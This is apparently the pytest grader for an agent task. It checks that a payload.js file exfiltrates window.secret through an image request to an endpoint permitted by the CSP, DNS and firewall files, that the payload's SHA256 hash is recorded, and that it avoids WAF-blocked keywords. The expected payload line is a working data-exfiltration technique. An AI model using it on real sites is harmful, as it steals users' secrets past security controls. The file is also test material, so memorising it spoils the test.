# test_final_state.py

import os
import json
import hashlib
import pytest

def get_allowed_endpoint():
    # 1. Parse CSP
    csp_path = "/home/user/csp.txt"
    assert os.path.exists(csp_path), f"{csp_path} is missing."
    with open(csp_path, 'r') as f:
        csp_content = f.read().strip()

    img_src_part = ""
    for part in csp_content.split(';'):
        if part.strip().startswith('img-src'):
            img_src_part = part.strip()
            break

    assert img_src_part, "img-src directive not found in CSP."
    allowed_domains = img_src_part.split()[1:] # Skip 'img-src'

    # 2. Parse DNS
    dns_path = "/home/user/dns.txt"
    assert os.path.exists(dns_path), f"{dns_path} is missing."
    dns_map = {}
    with open(dns_path, 'r') as f:
        for line in f:
            if line.strip():
                domain, ip = line.strip().split()
                dns_map[domain] = ip

    # 3. Parse Firewall
    fw_path = "/home/user/firewall.json"
    assert os.path.exists(fw_path), f"{fw_path} is missing."
    with open(fw_path, 'r') as f:
        fw_data = json.load(f)

    fw_rules = fw_data.get("outbound", [])

    # 4. Find the intersection
    valid_url = None
    for url in allowed_domains:
        if url.startswith("http://"):
            domain = url[7:]
            port = 80
        elif url.startswith("https://"):
            domain = url[8:]
            port = 443
        else:
            continue

        if domain in dns_map:
            ip = dns_map[domain]
            # Check firewall
            for rule in fw_rules:
                if rule.get("ip") == ip and rule.get("port") == port:
                    if rule.get("action") == "ALLOW":
                        valid_url = url
                    break

    assert valid_url is not None, "Could not derive a valid allowed endpoint from the configuration files."
    return valid_url

def test_payload_js_exists_and_correct():
    filepath = "/home/user/payload.js"
    assert os.path.exists(filepath), f"{filepath} is missing. The payload script was not generated."

    valid_url = get_allowed_endpoint()
    expected_payload = f'var img = new Image();\nimg.src = "{valid_url}/?val=" + window.secret;'

    with open(filepath, 'r') as f:
        content = f.read().strip()

    assert content == expected_payload, f"The content of {filepath} does not match the expected payload structure or uses the wrong endpoint."

def test_fim_hash_txt_exists_and_correct():
    payload_path = "/home/user/payload.js"
    hash_path = "/home/user/fim_hash.txt"

    assert os.path.exists(payload_path), f"{payload_path} is missing, cannot verify hash."
    assert os.path.exists(hash_path), f"{hash_path} is missing. The hash file was not generated."

    with open(payload_path, 'rb') as f:
        payload_bytes = f.read()

    expected_hash = hashlib.sha256(payload_bytes).hexdigest()

    with open(hash_path, 'r') as f:
        actual_hash = f.read().strip()

    assert actual_hash == expected_hash, f"The hash in {hash_path} does not match the SHA256 hash of {payload_path}."

def test_waf_rules_not_violated():
    filepath = "/home/user/payload.js"
    waf_path = "/home/user/waf_rules.txt"

    assert os.path.exists(filepath), f"{filepath} is missing."
    assert os.path.exists(waf_path), f"{waf_path} is missing."

    with open(filepath, 'r') as f:
        payload_content = f.read().lower()

    with open(waf_path, 'r') as f:
        waf_rules = [line.strip().lower() for line in f if line.strip()]

    for rule in waf_rules:
        assert rule not in payload_content, f"Payload contains blocked WAF keyword: {rule}"